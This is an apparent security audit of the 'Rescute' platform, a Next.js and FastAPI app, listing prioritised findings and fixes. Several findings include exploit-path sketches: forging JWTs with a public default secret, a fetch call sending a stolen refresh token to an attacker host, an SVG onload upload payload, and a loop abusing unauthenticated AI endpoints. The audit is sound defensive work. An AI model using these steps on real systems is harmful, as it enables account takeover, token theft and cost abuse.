# Security Audit — Rescute (full platform)

**Date:** 2026-07-06
**Scope:** `rescute/` (Next.js 16 frontend), `rescute-api/` (FastAPI backend), root `render.yaml` / `docker-compose.yml` / `.gitignore`. AuthN/AuthZ, injection, secrets, dependencies, CORS/headers, file uploads, AI feature.
**Method:** Manual code review, `npm audit`, ORM query inspection, secret-pattern grep, config review. Backend `pip-audit` not run (not installed in env — see SCA note).

## Summary
Overall posture is **mixed**. The backend's core data-access authorization is genuinely well done — SQL is 100% ORM-parameterized and every mutating resource route enforces per-owner checks (no IDOR on cats/donations/adoptions). The serious problems are concentrated in **authentication token handling, unauthenticated cost/abuse-prone endpoints, file-upload validation, and a fail-open secret default**. Counts: 🔴 1 · 🟠 4 · 🟡 6 · 🔵 3 · ⚪ 2.

---

## Findings

### 🔴 Forgeable JWTs via fail-open `SECRET_KEY` default
- **Location:** `rescute-api/app/config.py:6` (`SECRET_KEY: str = "dev-secret-key"`), consumed at `app/application/auth_service.py:77,81` and `app/adapters/inbound/api/middleware/auth.py:23`.
- **Category:** A04 Cryptographic Failures / A07 Authentication Failures (CWE-798, CWE-321).
- **Description:** JWTs are signed HS256 with `settings.SECRET_KEY`. If the `SECRET_KEY` env var is ever unset, the code silently falls back to the public constant `"dev-secret-key"`. Anyone knowing this value (it's in the repo) can forge a token with `{"sub": "<any user_id>", "role": "protector"}` and fully impersonate any user — total auth bypass.
- **Exploit path:** Deploy or run any instance without `SECRET_KEY` set → forge `jwt.encode({"sub": victim_uuid, "role":"protector","exp":...}, "dev-secret-key")` → send as Bearer token → `get_current_user` accepts it.
- **Mitigation status:** `render.yaml:11-12` sets `generateValue: true`, so the documented Render deploy is protected. The risk is the **fail-open pattern**: no startup assertion that the secret was overridden. `docker-compose.yml` and local dev run on the weak default.
- **Fix:** **Bounded fix** — remove the default; make `SECRET_KEY` a required setting (no default) so the app refuses to boot without it, or assert `!= "dev-secret-key"` at startup. Also `min_length` on the value.

### 🟠 Unauthenticated AI endpoints → unbounded OpenAI cost / DoS
- **Location:** `rescute-api/app/adapters/inbound/api/ai_care_router.py:27-50` (`/ai-care/ask`, `/ai-care/chat`) — no `Depends(get_current_user)`, no rate limit.
- **Category:** A06 Insecure Design / A04:2025-related resource exhaustion (CWE-770).
- **Description:** Both AI routes are fully public and each call proxies to OpenAI (`openai_provider.py:37-64`, up to 600 completion tokens). Anyone on the internet can loop these to drain the `AI_PROVIDER_KEY` credits and rack up cost, or exhaust the backend's 30s-timeout worker pool.
- **Exploit path:** `for i in ...: POST /api/v1/ai-care/chat {messages:[{role:"user",content:"..."}]}` — no auth, no throttle, direct billing impact.
- **Fix:** **Architect decision** — decide whether cat-care chat should require login at all, then add auth and/or per-IP + per-user rate limiting (e.g. `slowapi`). Design-level because it affects the product's public-chat UX.

### 🟠 Session tokens stored in `localStorage` + non-httpOnly cookie
- **Location:** `rescute/src/lib/auth/tokens.ts:1-21` (`localStorage.setItem('access_token'...)`, and `document.cookie = 'session-token=...; SameSite=Lax'` — no `httpOnly`, no `Secure`).
- **Category:** A07 Authentication Failures (CWE-522, CWE-1004).
- **Description:** Access + refresh tokens live in `localStorage`, and the access token is mirrored into a JS-readable, non-`Secure` cookie. Any XSS (see SVG-upload finding, or any dependency XSS) exfiltrates all tokens → full account takeover. `Secure` absence also allows leakage over plain HTTP.
- **Exploit path:** XSS payload runs `fetch(attacker, {body: localStorage.getItem('refresh_token')})` → attacker holds a 7-day refresh token.
- **Fix:** **Architect decision** — move to backend-set `httpOnly; Secure; SameSite` cookies for the refresh token (requires an API auth-flow redesign and CSRF consideration). Escalate; not a surgical change.

### 🟠 File upload trusts client `Content-Type`; enables stored XSS via SVG/HTML
- **Location:** `rescute-api/app/adapters/inbound/api/upload_router.py:20-41`; files served publicly at `app/main.py:38` (`app.mount("/uploads", StaticFiles(...))`).
- **Category:** A05 Injection / A08 Integrity (CWE-434, CWE-79).
- **Description:** Validation is `file.content_type.startswith("image/")` — the content-type is attacker-supplied. No magic-byte sniffing. `ext` is taken from the user filename (`os.path.splitext(file.filename)[1]`, line 34) and appended verbatim. An attacker uploads malicious SVG (or HTML) with header `Content-Type: image/svg+xml` and extension `.svg`; it's stored and served from `/uploads/<uuid>.svg`. Opening/embedding that URL executes attacker JS in the API origin context → stored XSS.
- **Exploit path:** `POST /api/v1/uploads` with `Content-Type: image/svg+xml`, body `<svg onload=...>` → returned `url` served as active content by StaticFiles.
- **Fix:** **Bounded fix** — sniff real content by magic bytes (`filetype`/Pillow), allowlist real raster types (jpeg/png/webp) not the client header, force a safe extension from the sniffed type (ignore user filename ext), and serve `Content-Disposition: attachment` / `X-Content-Type-Options: nosniff`. (Also note HANDOFF confirms Render ephemeral FS — separate durability issue, see Insecure Design below.)

### 🟡 No brute-force / rate-limit protection on auth endpoints
- **Location:** `rescute-api/app/adapters/inbound/api/auth_router.py:38-51` (`/auth/login`), `:17` (`/register`), `:54` (`/refresh`).
- **Category:** A07 Authentication Failures (CWE-307).
- **Description:** Login has no attempt throttling, lockout, or CAPTCHA → credential stuffing / password spraying is unbounded. Register has no throttle → account/PII spam.
- **Fix:** **Architect decision** (cross-cutting middleware) — add rate limiting (per IP + per account) across auth routes.

### 🟡 Refresh flow: no token-type separation, no revocation/rotation tracking
- **Location:** `rescute-api/app/adapters/inbound/api/auth_router.py:54-65` calling `auth_service.get_current_user()` (`auth_service.py:62-73`); token minting `auth_service.py:75-81`.
- **Category:** A07 Authentication Failures (CWE-613).
- **Description:** Access and refresh tokens carry only `sub`/`exp` with no `type` claim, so an **access token is accepted at `/auth/refresh`** and vice-versa. Tokens are stateless with no server-side revocation list or rotation-reuse detection — a stolen refresh token is valid for the full 7 days with no way to invalidate it (logout only clears client storage). No brute-force protection compounds this.
- **Fix:** **Bounded fix** for the type claim (add `"type":"refresh"` and verify it). **Architect decision** for revocation/rotation strategy (needs a store).

### 🟡 Unauthenticated donation contribution + missing amount validation
- **Location:** `rescute-api/app/adapters/inbound/api/donation_router.py:54-69` (`/donations/{id}/contribute`) and `:72-85` (`/intent`); `app/application/donation_service.py:19-26` (`post.current_amount += amount`, no positivity check).
- **Category:** A01 Broken Access Control / A08 Data Integrity (CWE-862, CWE-20).
- **Description:** `contribute` is public and blindly adds `amount` to `current_amount` with no auth and no `amount > 0` enforcement at the service layer. Anyone can arbitrarily inflate (or, if the schema permits negatives, deflate) any campaign's displayed total — donation-fraud / integrity problem. `submit_intent` is also public and stores donor PII with no throttle.
- **Fix:** **Bounded fix** — enforce `amount > 0` (schema `gt=0`), and confirm with product whether contributions record real payment (currently it just increments a number — no payment gateway is integrated, which is itself a design gap). Rate-limit intents.

### 🟡 Dead but dangerous fake server session
- **Location:** `rescute/src/lib/auth/session.ts:4-17` — `getUserSession()` returns a hardcoded `{ id: '123', name: 'User Profile' }` for **any** non-empty `session-token` cookie; `requireAuth()` redirects only if the cookie is absent.
- **Category:** A01 Broken Access Control / Insecure Design (CWE-287).
- **Description:** This "authorizes" purely on cookie presence and returns a fake fixed identity — it never validates the JWT. Grep confirms it is **not currently imported anywhere**, so it is dead code today. But it's a landmine: the moment a server component uses `requireAuth()`/`getUserSession()` for data access, it becomes an instant auth bypass + identity confusion.
- **Fix:** **Bounded fix** — delete this module or replace with real JWT verification before any use. Flag so it never gets wired up as-is.

### 🟡 Next.js image optimizer as open proxy + private-IP fetch (SSRF surface)
- **Location:** `rescute/next.config.ts:5-21` — `dangerouslyAllowLocalIP: true` and `remotePatterns: [{ protocol:'https', hostname:'**' }]`.
- **Category:** A01:2025 (SSRF) / A02 Security Misconfiguration (CWE-918).
- **Description:** `hostname:'**'` makes `/_next/image?url=` proxy **any** HTTPS host, and `dangerouslyAllowLocalIP:true` (added for dev per HANDOFF) removes the private-IP guard in production too. This turns the deployed image endpoint into an open proxy that can also reach internal/loopback HTTPS services from the Vercel edge, and enables request laundering / DoS amplification.
- **Fix:** **Bounded fix** — restrict `remotePatterns` to the actual known host(s) (the Render API domain), and gate `dangerouslyAllowLocalIP` behind `process.env.NODE_ENV !== 'production'`.

### 🟡 Verbose error disclosure (internal + upstream)
- **Location:** `rescute-api/app/adapters/outbound/ai/openai_provider.py:57-60` (returns up to 500 chars of the upstream OpenAI error body) surfaced to the client at `ai_care_router.py:35-36,49-50` as `detail=str(error)`; also raw `ValueError` text echoed across routers (e.g. `cat_router.py:49`, `auth_router.py:29-30`).
- **Category:** A02 Security Misconfiguration / A09 (CWE-209).
- **Description:** Upstream provider error bodies and internal exception strings are returned to clients, leaking implementation/provider details useful for reconnaissance.
- **Fix:** **Bounded fix** — return generic client messages; log details server-side only.

### 🔵 Missing security headers (API and frontend)
- **Location:** `rescute-api/app/main.py` (no header middleware) and `rescute/next.config.ts` (no `headers()`).
- **Category:** A02 Security Misconfiguration (CWE-693).
- **Description:** No `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, or `frame-ancestors`/`X-Frame-Options` on either app. `nosniff` in particular compounds the SVG-upload finding.
- **Fix:** **Bounded fix** — add a headers middleware (backend) and `headers()` in `next.config.ts`.

### 🔵 SCA: `postcss` XSS advisory (transitive) + committed lockfiles OK
- **Location:** `rescute/package-lock.json` — `postcss <8.5.10` via `next` (GHSA-qx2v-qp2m-jg93, moderate). Backend: `poetry.lock` and `requirements.txt` present and pinned with bounded ranges (good).
- **Category:** A03 Software Supply Chain Failures.
- **Description:** `npm audit` reports 2 moderate (postcss stringify XSS, reachable only in CSS build tooling — low real exploitability for this app). Fix is gated behind a `next` major downgrade, so **don't** `audit fix --force`. Backend `pip-audit` was not runnable in this env — recommend running it in CI; note `python-jose` is comparatively lightly maintained (consider `PyJWT`).
- **Fix:** **Bounded fix** — track `next` upgrade for the postcss transitive fix; add `pip-audit`/`npm audit` as CI gates.

### 🔵 CORS always allows localhost with credentials
- **Location:** `rescute-api/app/main.py:10-17,26` — `http://localhost:3000` + `127.0.0.1:3000` are unconditionally in `allow_origins` with `allow_credentials=True`.
- **Category:** A02 Security Misconfiguration.
- **Description:** No wildcard (good), but localhost origins remain allowed in production. Low practical risk (attacker can't force a victim's browser origin to be localhost), but unnecessary surface.
- **Fix:** **Bounded fix** — include localhost origins only when not in production.

### ⚪ Seed password constant in source
- **Location:** `rescute-api/scripts/seed.py:19` (`SEED_PASSWORD = "Rescute123!"`), account `protetor@rescute.app`.
- **Note:** Dev-seed only; ensure the seed script is never run against production (creates a known-credential protector account with content-management rights).

### ⚪ 1.1 MB `Capturar.png` committed at repo root
- **Location:** `C:\Users\felip\repositories\rescute\Capturar.png`.
- **Note:** Not a secret (screenshot). `.gitignore` `*.png` rule doesn't retroactively remove it. Housekeeping only.

---

## Not Vulnerable (verified — do not re-spec these)
- **SQL injection:** none — all queries use SQLAlchemy `select()` with bound params; the one `ilike(f"%{name}%")` (`cat_repository.py:36`) interpolates into a **bind parameter value**, not raw SQL. Safe.
- **IDOR on core resources:** correctly prevented — `cat_service.py:15-28`, `donation_service.py:28-35`, `adoption_service.py:25-39` all scope by `protector_id`; `user_router.py` is `/me`-only.
- **AI prompt-role injection:** the chat schema pins `role` to `^(user|assistant)$` (`schemas/ai_care.py:18`), so clients cannot inject a `system` role.
- **Committed secrets:** none found; `.gitignore:18-19` covers `.env`/`.env.*`, `render.yaml` uses `sync:false`/`generateValue:true`, `docker-compose.yml` holds only local throwaway `rescute/rescute` credentials.

---

## Remediated This Session
- None — review-only audit; no code modified.

## Escalated to Architect (design decisions)
- AI endpoint auth + rate-limiting model (`ai_care_router.py:27-50`) — public-chat UX vs. cost/DoS trade-off.
- Token storage redesign to `httpOnly` cookies (`tokens.ts`) — auth-flow + CSRF implications.
- Auth-wide rate limiting / brute-force protection (`auth_router.py`).
- Refresh-token revocation/rotation strategy (`auth_router.py:54-65`) — needs a store.
- Donation contribution auth + real payment integration (`donation_router.py:54-69`).

## Bounded fixes (Implementer-ready against a spec)
- Require `SECRET_KEY`, drop `"dev-secret-key"` default + startup assertion (`config.py:6`).
- Magic-byte file-type validation, safe extension, `nosniff`/attachment on uploads (`upload_router.py:20-41`, `main.py:38`).
- Add `type` claim to refresh tokens and verify it (`auth_service.py:75-81`).
- Enforce `amount > 0` on contributions (`donation_service.py:19-26` / schema).
- Delete/replace fake `session.ts` (`session.ts:4-17`).
- Restrict `next.config.ts` `remotePatterns` and gate `dangerouslyAllowLocalIP` to dev.
- Generic error messages instead of raw upstream/internal strings.
- Security-header middleware (backend) + `headers()` (frontend).
- Conditional localhost CORS; add `pip-audit`/`npm audit` CI gates.

## Residual Risk
- Uploaded photos on Render ephemeral FS (HANDOFF-confirmed) — data-durability, not a security control, but relevant to Insecure Design; move to object storage.
- `python-jose` maintenance posture — consider migrating to `PyJWT`.
